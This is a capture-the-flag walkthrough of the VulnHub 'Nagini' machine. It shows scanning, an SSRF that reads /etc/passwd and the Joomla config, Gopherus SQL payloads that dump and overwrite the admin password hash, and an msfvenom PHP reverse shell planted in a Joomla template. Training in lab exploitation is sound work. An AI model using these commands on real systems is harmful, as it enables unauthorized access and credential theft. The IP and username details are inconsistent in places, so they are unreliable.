# Walkthrough VULNHUB --> HARRY POTTER: NAGINI

First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.172.

We use nmap to scan the target machine with the command:

```bash
nmap -sC -sV -p- 192.168.1.174
```

![Alt text](./img/nmap.PNG?raw=true "NMAP Results")

I navigate to the web page to see what it is and to check if we find any visible vulnerability on that page.

![Alt text](./img/web_page_port80.PNG?raw=true "Port 80")

We run a scan on the port 80 with gobuster to search for interesting things.

```bash
gobuster dir --url http://192.168.1.174 -x .php,.js,.txt,.html --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
```

![Alt text](./img/gobuster.PNG?raw=true "GOBUSTER SCAN")

We start browsing the /note.txt and we find as follow:

```
Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
```

**WE NEED HTTP3!!!!!**

We also need to add **quic.nagini.hogwarts** in our **/etc/hosts**.

After spending some time on internet trying to figure out how to use this http3, I found this guide to enable **curl** with http3 support.

[https://github.com/curl/curl/blob/master/docs/HTTP3.md](https://github.com/curl/curl/blob/master/docs/HTTP3.md)

**NOW I built a new curl with http3 support**

Using curl we do a GET request on https://quic.nagini.hogwarts:

```bash
./curl --http3 https://quic.nagini.hogwarts
```

![Alt text](./img/http3.PNG?raw=true "CURL HTTP3")

We retrieve 2 important informations:
1 /internalResourceFeTcher.php
2 .bak

Let's see what is /internalResourceFeTcher.php

![Alt text](./img/internalFetcher.PNG?raw=true "/internalResourceFeTcher.php")

Let's try to search for a and see the result.

![Alt text](./img/a.PNG?raw=true "/internalResourceFeTcher.php search")

Noted something?

The search append in the url **?url=a**, so let's try to see if there is any **SSRF** vulnerability using in the url **file:///etc/passwd**

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///etc/passwd
```

![Alt text](./img/passwd.PNG?raw=true "/etc/passwd")

As you might have noticed, in the webserver there is Joomla, so now let's see if we can access to Jumla configuration file.

```bash
curl http://192.168.1.174/internalResourceFeTcher.php?url=file:///var/www/html/joomla/configuration.php
```

![Alt text](./img/config.PNG?raw=true "/var/www/html/joomla/configuration.php")

Searching on Google "SSRF exploit mysql",
![Alt text](./img/google.PNG?raw=true "Google search")
I found my answers in [Gopherus](https://github.com/tarunkant/Gopherus)

First step with Gopherus is to create a payload that give us the table list so using the command **use joomla; show tables;**.
![Alt text](./img/showTables.PNG?raw=true "SHOW Tables payload")

Appending the payload to curl, does not work.

So, I try to add the payload on the url in the browser. It seems that doesn't work either.

**At the end I pasted the payload in the search and submitted by clicking on Fetch**

If you don't see anything refresh the page, it can take few refresh before something is displayed.

![Alt text](./img/1Try.PNG?raw=true "List Tables")

As you can see we can display the tables and we can see that there is a joomla_users table, which we are going to see next by creating another payload with Gopherus as done previously.

The command we are going to run is:

```sql
USE joomla; SELECT * FROM joomla_users
```

We could list the users and find the user **site_admin** and it's password.
![Alt text](./img/joomla_users.PNG?raw=true "Joomla Users")

After trying a lot of MD5 decoder, I decided to create another payload to change the password using **password1234**, so it's hased is **bdc87b9c894da5168059e00ebffb9077**.

Our command will be then:

```sql
use joomla; update joomla_users set password = 'bdc87b9c894da5168059e00ebffb9077' where username='site_admin';select * from joomla_users;
```

![Alt text](./img/newP.PNG?raw=true "New Password")

We are now able to login in the Joomla's administration portal, by going to http://192.168.1.174/joomla/administrator

![Alt text](./img/joomlaAdminLogin.PNG?raw=true "Admin Login")

We can insert **super_admin**/**password1234** and we're in!

![Alt text](./img/adminPage.PNG?raw=true "Admin Page")

We can now modify a template adding a payload that we are going to generate with **msfvenom**

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.200 LPORT=4444 -f raw -o test.php
```

![Alt text](./img/msfVenom.PNG?raw=true "MSFVENOM")

Let's start **msfconsole** using **explit/multi/handler** and setting up the payload as **php/meterpreter/reverse_tcp**

![Alt text](./img/msf.PNG?raw=true "MSFCONSOLE")

Next step will be to copy the content of test.php into our joomla template, so let's see what is inside our payload:

```bash
cat test.php
```

![Alt text](./img/payload.PNG?raw=true "Payload")

Now we move into the Admin console and we navigate till the Template editor.

![Alt text](./img/editTemplate.PNG?raw=true "Edit Template")

We are going now to paste our payload in line 9 and we save.

![Alt text](./img/editedTemplate.PNG?raw=true "Edited Template")
